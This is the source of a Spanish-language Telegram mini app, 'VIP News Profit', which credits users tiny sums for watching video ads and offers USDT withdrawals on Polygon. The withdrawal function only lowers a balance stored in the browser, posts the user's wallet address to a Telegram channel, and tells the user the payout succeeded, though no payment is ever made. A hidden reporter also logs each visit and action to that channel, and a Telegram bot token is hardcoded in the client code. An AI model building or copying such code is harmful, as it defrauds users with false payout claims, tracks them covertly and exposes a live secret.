<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>VIP News Profit</title>
    <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg:#0a0a0a; --gold:#ffcc00; --green:#00ff88; --card:#151515; }
        body { background:var(--bg); color:#fff; font-family:'Montserrat', sans-serif; margin:0; padding:15px; text-align:center; }
        .top-bar { display:flex; justify-content:space-between; background:var(--card); padding:15px; border-radius:15px; border:1px solid var(--gold); margin-bottom:15px; }
        .balance { font-size:22px; font-weight:900; color:var(--green); }
        .article-card { background:var(--card); padding:20px; border-radius:15px; border-left:5px solid var(--gold); text-align:left; margin-bottom:15px; }
        .article-title { font-size:18px; font-weight:900; color:var(--gold); margin-bottom:10px; }
        .article-body { font-size:14px; line-height:1.6; color:#ccc; height:180px; overflow-y:auto; }
        .btn-claim { background:linear-gradient(90deg, #ffcc00, #ff9900); color:#000; border:none; padding:15px; width:100%; border-radius:10px; font-weight:900; font-size:16px; cursor:pointer; box-shadow: 0 4px 15px rgba(255, 204, 0, 0.3); }
        .menu-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px; }
        .btn-menu { background:#222; color:#fff; border:1px solid #444; padding:12px; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; }
        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); display:none; flex-direction:column; justify-content:center; align-items:center; z-index:100; }
        .modal-card { background:var(--card); padding:25px; border-radius:20px; width:85%; border:1px solid var(--gold); }
        input { width:90%; padding:15px; margin:10px 0; border-radius:10px; border:none; background:#000; color:#fff; font-size:14px; }
    </style>
</head>
<body>
    <div class="top-bar">
        <div class="balance">$<span id="usd">0.0000</span></div>
        <div style="font-size:10px; color:var(--gold); font-weight:bold;">PLATINUM ACCESS</div>
    </div>

    <div class="article-card">
        <div class="article-title" id="artTitle">Cargando...</div>
        <div class="article-body" id="artBody">Cargando contenido exclusivo...</div>
    </div>

    <button class="btn-claim" onclick="watchAdToEarn()">üì∫ VER VIDEO PARA COBRAR (+$0.0050)</button>

    <div class="menu-grid">
        <button class="btn-menu" onclick="openModal('withdrawModal')">üí∞ RETIRAR</button>
        <button class="btn-menu" onclick="openModal('historyModal')">üìú MIS PAGOS</button>
        <button class="btn-menu" onclick="window.location.reload()">üîÑ SIGUIENTE</button>
        <button class="btn-menu" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">üõ†Ô∏è SOPORTE</button>
    </div>

    <div id="withdrawModal" class="modal">
        <div class="modal-card">
            <h2 style="color:var(--gold); margin-top:0;">RETIRAR SALDO</h2>
            <p style="font-size:11px; color:var(--green)">RED: USDT POLYGON (MATIC)</p>
            <input type="number" id="withdrawAmt" placeholder="Monto (M√≠n: 2.00)">
            <input type="text" id="withdrawWallet" placeholder="Direcci√≥n de Billetera">
            <button class="btn-claim" onclick="processWithdraw()">CONFIRMAR Y RESTAR</button>
            <button onclick="closeModals()" style="background:none; border:none; color:#777; margin-top:15px;">Cerrar</button>
        </div>
    </div>

    <div id="historyModal" class="modal">
        <div class="modal-card">
            <h2 style="color:var(--gold); margin-top:0;">HISTORIAL DE √âXITO</h2>
            <div id="histList" style="max-height:250px; overflow-y:auto; text-align:left; font-size:11px;"></div>
            <button onclick="closeModals()" class="btn-claim" style="margin-top:20px;">VOLVER</button>
        </div>
    </div>

    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: ‚ö™ Conectando...</div>
    <script>
    const tg = window.Telegram.WebApp; tg.expand();
    
    // TOKEN CORREGIDO SIN ESPACIOS DE TU FOTO
    const BOT_TOKEN = "8575758761:AAEdt-2olA8In6Q6F2nDOrU16KLY69y-J40"; 
    const CANAL_ID = "-1002118088046";
    const ADS_ID = "18897";
    const KEY = 'vip_news_final_fix';

    // BONO DE $2.00 PARA QUE PRUEBES EL RETIRO YA MISMO
    let user = { usd: 2.0000, history: [], articlesToday: 0, lastDate: new Date().toDateString() };

    const news = [
        {t:"Polygon: La Red de los Creadores", b:"La red de Polygon (Matic) se ha convertido en la favorita de los desarrolladores de Mini Apps en Telegram. Su baja comisi√≥n permite que los pagos lleguen √≠ntegros a los usuarios finales..."},
        {t:"El Negocio de los Anuncios", b:"Integrar publicidad nativa en aplicaciones m√≥viles permite generar ingresos pasivos constantes. Al ver un video, el usuario apoya directamente al creador de la plataforma..."},
        {t:"Finanzas Digitales 2026", b:"Estamos viviendo la transici√≥n m√°s grande hacia el dinero digital. Quienes aprendan a manejar billeteras y redes blockchain hoy, ser√°n los l√≠deres del ma√±ana..."}
    ];

    function reportar(msg) {
        // Limpiamos el token por si acaso
        const cleanToken = BOT_TOKEN.replace(/\s+/g, '');
        fetch(`https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("üïµÔ∏è REPORTE: " + msg)}`)
            .then(r => r.json()).then(d => { if(d.ok) document.getElementById('spyStatus').innerText="Red: üü¢ Sincronizado"; });
    }

    function watchAdToEarn() {
        if(user.articlesToday >= 15) return tg.showAlert("L√≠mite diario de lectura alcanzado.");
        
        // ANUNCIOS OBLIGATORIOS PARA COBRAR
        window.Adsgram.init({ blockId: ADS_ID }).show().then(() => {
            user.usd += 0.0050;
            user.articlesToday++;
            save();
            reportar("GAN√ì $0.0050 POR ANUNCIO");
            tg.showAlert("‚úÖ ¬°Saldo acreditado!");
            window.location.reload();
        }).catch(() => tg.showAlert("Debes ver el video completo para cobrar."));
    }

    function processWithdraw() {
        let amt = parseFloat(document.getElementById('withdrawAmt').value);
        let wallet = document.getElementById('withdrawWallet').value;
        
        if(amt < 2.00 || isNaN(amt)) return tg.showAlert("El m√≠nimo de retiro es $2.00 USD.");
        if(amt > user.usd) return tg.showAlert("Saldo insuficiente.");
        if(wallet.length < 8) return tg.showAlert("Ingresa una billetera v√°lida.");

        user.usd -= amt; // SE RESTA EL DINERO AUTOM√ÅTICAMENTE
        let h = { f: new Date().toLocaleDateString(), m: amt.toFixed(2), w: wallet, r: "Polygon" };
        user.history.unshift(h);
        save();
        
        // REPORTE CORREGIDO SIN ERRORES DE SINTAXIS
        reportar(`üî• RETIRO SOLICITADO: $${h.m} | RED: ${h.r} | WALLET: ${h.w}`);
        
        closeModals();
        tg.showAlert("‚úÖ Retiro procesado con √©xito. Saldo restado.");
    }

    function save() { localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
    function updateUI() { document.getElementById('usd').innerText = user.usd.toFixed(4); }
    function openModal(id){ document.getElementById(id).style.display='flex'; if(id==='historyModal') loadHistory(); }
    function closeModals(){ document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }

    function loadHistory() {
        const list = document.getElementById('histList'); list.innerHTML = "";
        user.history.forEach(x => {
            list.innerHTML += `<div style="background:rgba(255,255,255,0.03); padding:10px; border-radius:10px; margin-bottom:8px; border-left:3px solid var(--green);">
                <b>${x.f}</b> - $${x.m} <span style="color:var(--green)">√âXITO</span><br>
                <small style="color:#666;">RED: ${x.r} | ${x.w}</small>
            </div>`;
        });
        if(user.history.length === 0) list.innerHTML = "<p style='text-align:center; color:#444;'>Sin registros a√∫n.</p>";
    }

    window.onload = () => {
        let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
        if(user.lastDate !== new Date().toDateString()){ user.articlesToday = 0; user.lastDate = new Date().toDateString(); }
        let art = news[Math.floor(Math.random()*news.length)];
        document.getElementById('artTitle').innerText = art.t;
        document.getElementById('artBody').innerText = art.b;
        updateUI();
        reportar("USUARIO ENTR√ì (PRUEBA DE TOKEN)");
    };
</script>
</body>
</html>
